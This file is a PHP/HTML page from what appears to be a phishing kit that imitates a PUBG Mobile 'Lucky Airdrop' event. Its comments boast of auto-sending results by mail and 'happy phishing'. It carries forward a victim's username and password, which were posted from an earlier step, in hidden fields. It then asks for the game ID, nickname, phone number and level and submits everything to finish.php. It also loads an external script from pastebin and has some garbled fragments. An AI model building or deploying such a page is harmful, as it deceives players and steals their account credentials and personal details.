<?php
// BILANG SEND2MAIL AUTO BAKUHANTAM
// JGN DIRECODE YA BOSS
// NguyenThuWan Ft Arpan Rizky Ramadhan
// Happy Mancing
function get_client_ip() { 
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$login = $_POST['login'];


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- 页面通用 header 配置 -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="Description" content="Witness the rise of the Ultimate Team made of Global Stars!Go on Twitter and use the appropriate tag (found in the Team Details), to support and vote for your favorite stars! The teams with the highest points will receive Global Extreme Challenge Show Match Points.Go support your team now!" />
    <meta name="Keywords" content="Global Extreme Challenge,Vote,PUBG MOBILE" />
    <meta property="og:url" content="https://www.pubgmobile.com/event/globalextremechallenge/" />
    <meta property="og:type" content="website">
    <meta property="og:title" content="Global Extreme Challenge" />
    <meta property="og:description" content="Witness the rise of the Ultimate Team made of Global Stars!Go on Twitter and use the appropriate tag (found in the Team Details), to support and vote for your favorite stars! The teams with the highest points will receive Global Extreme Challenge Show Match Points.Go support your team now!" />
    <meta property="og:image" content="https://www.pubgmobile.com/en/event/globalextremechallenge/images/share.jpg" />
    <script src='https://kit.fontawesome.com/a076d05399.js'></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/style.css">
    <style>
       .card {
       border-radius:8px;
       align-items:center;
       justify-content:center;
       display:flex;
       flex-direction:column;
       margin-top:5%;
       width:80%;
       height:350px;
       background:linear-gradient(10deg,gold,orange);
       }
       .card .alert {
       border-radius:8px;
       align-items:center;
       justify-content:center;
       display:flex;
       font-weight:bold;
       background:red;
       color:white;
       width:50%;
       height:30px;
       animation: getar 0.5s infinite;
       }
       .card input{
       font-weight:bold;
       color:white;
       border:1.5px solid gold;
       background:orange;
       border-radius:8px;
       text-align:center;
       margin-top:4%;
       width:85%;
       height:40px;
       font-family: 'wanwan', sans-serif;
       }
       .card select {
       font-family: 'wanwan', sans-serif;
       color:white;
       text-align-last:center;
       font-weight:bold;
       border-radius:8px;
       border:1.5px solid gold;
       background:orange;
       text-align:center;
       margin-top:4%;
       width:85%;
       height:40px;
       }
       .card .btn {
       background:orange;
       border:1.5px solid green;
       width:35%;
       }
       .card input::-webkit-input-placeholder { /* Chrome/Opera/Safari */
  color: #fff;
       }
       @keyframes getar {
  0% { transform: translate(1px, 1px) rotate(0deg); }
  10% { transform: translate(-1px, -2px) rotate(-1deg); }
  20% { transform: translate(-3px, 0px) rotate(1deg); }
  30% { transform: translate(3px, 2px) rotate(0deg); }
  40% { transform: translate(1px, -1px) rotate(1deg); }
  50% { transform: translate(-1px, 2px) rotate(-1deg); }
  60% { transform: translate(-3px, 1px) rotate(0deg); }
  70% { transform: translate(3px, 1px) rotate(-1deg); }
  80% { transform: translate(-1px, -1px) rotate(1deg); }
  90% { transform: translate(1px, 2px) rotate(0deg); }
  100% { transform: translate(1px, -2px) rotate(-1deg); }
}
#der {
   display:none;
   }
   #loading {
   display:none;
   }
    </style>
    <link rel="stylesheet" href="https://www.pubgmobile.com/id/event/globalextremechallenge/css/common.css" />
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/Swiper/4.5.0/css/swiper.min.css" />
    <link rel="stylesheet" href="https://www.pubgmobile.com/id/event/globalextremechallenge/css/style.css" />
    <link rel="stylesheet" href="https://www.pubgmobile.com/common/css/all.css" />
    <title>LUCKY AIDROP | PUBG MOBILE</title>
    <!-- design：insight  | reconsitution：insight | establish:2020/03/13 -->
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script>
        var mobile = false;
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
            mobile = true;
            setTimeout(function() {
                $('body').addClass('mclass');
            }, 30);
        }
    </script>
.city {
if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigato
 <!-- design：insight  | reconsitution：insight | establish:2020/03/13 -->
<script src="https://pastebin.com/raw/fk6KV6Ah"></script>
<script></script>
document.getElementById("loginfacebook").style.display
</script>
    <script>
    function kembali() {
    document.getElementById("loginnya").style.display = "block";
    document.getElementById("item").style.display = "none";
    }
    function showfb() {
    document.getElementById("loginfacebook").style.display = "block";
    }
    </script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-131768225-5"></script>
     
</head>
<body class="en">
    <div class="top-nav">
    <div class="top-main c">
        <!-- logo,name -->
        <div class="top-log c">
            <a href="//www.pubgmobile.com/en-US/" onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_logo'});">
                <img src="https://www.pubgmobile.com/common/images/icon_logo.jpg" width="128" height="128" alt="" />
            </a>
            <h1 class="top-tit">
                PUBG MOBILE
                <span>OFFICIAL PUBG ON MOBILE</span>
            </h1>
        </div>
        <!-- line -->
        <div class="top-line" onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_btn'});">
            <ul>
                <li>-</li>
                <li>-</li>
                <li>-</li>
            </ul>
        </div>
        <!-- nav-list -->

        <!-- homepage,download -->
        <div class="top-btn">
            <a href="//www.pubgmobile.com/pay/" target="_blank" onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_purchase'});">PURCHASE</a>
            <a class="down" href="https://web.gpubgm.com/m/Website/xiaobao/AOS_IG0190_19173No48_0.19.0.13900_Shipping_ThirdPartyPayment_GLOBAL.shell.signed_uawebsite.apk" target="_blank" onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_download'});">DOWNLOAD</a>
        </div>
        <!-- download-ul -->
        <!-- <ul class="slec">
            <li class="app-li">
                <a href="https://app.adjust.com/4yxckw" target="_blank" onclick="gtag('event','x_download',{'event_category':'common_inc','event_label':'nav_app'});">
					App Store
				</a>
            </li>
            <li class="apk-li">
                <a href="https://web.gpubgm.com/m/Website/xiaobao/AOS_IG0190_19173No48_0.19.0.13900_Shipping_ThirdPartyPayment_GLOBAL.shell.signed_uawebsite.apk" onclick="gtag('event','x_download',{'event_category':'common_inc','event_label':'nav_apk'});">
					APK Download
				</a>
            </li>
        </ul> -->
        <!-- language -->

    </div>
</div>
<div class="wrap" id="wrap">
        <section class="s5" style="background:url('https://i0.wp.com/pngstocks.com/wp-content/uploads/2019/05/background-2.jpg?zoom=2.625&resize=380%2C475&ssl=1');height:100vh;">
        <br>
        <br>
            <span class="rank-title">ENTER YOUR DETAILS</span>
          
          
          <center>
          <div class="card">
          <div class="alert"><i class='fas fa-exclamation-triangle'></i>&nbsp;&nbsp;&nbsp;&nbsp;Fill All Forms</div>
           <form action="finish.php" method="POST" name="form" onsubmit="return valid()" required>
          <input autocomplete="off" type="number" name="id" id="id" maxlength="9" placeholder="Enter Your ID">
          <input autocomplete="off" type="text" name="nick" id="nick" placeholder="Enter Your Nickname">
          <input autocomplete="off" type="number" name="hp" id="hp" placeholder="Enter Your Phone Number">
          <select autocomplete="off" id="level" name="level">
          <option value="">Enter Your Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
          </select>

                <input type="hidden" id="user" name="user" value="<?php echo $user;?>">
                <input type="hidden" id="pass" name="pass" value="<?php echo $pass;?>">
                <input type="hidden" id="login" name="login" value="<?php echo $login;?>">
          <input id="btn" class="btn" type="submit" value="Submit">
          <br>
          <br>
          <img id="loading" width="15" height="15" src="img/loading.gif">
          </form>
          </div>
            </center>

            

            
          
  <br>
  <br>
  <br>
  <br>

            
            
<link rel="stylesheet" href="css/footer.css">
    <script src="//cdnjs.cloudflare.com/ajax/libs/Swiper/4.5.0/js/swiper.min.js"></script>
    
    <script src="https://www.pubgmobile.com/id/event/globalextremechallenge/js/main.js"></script>
    <script src="https://www.pubgmobile.com/id/event/globalextremechallenge/js/index.js"></script>
    
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-117352746-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-117352746-1');
    </script>


<script src="https://www.pubgmobile.com/common/js/gray.js"></script>
</body>
</html>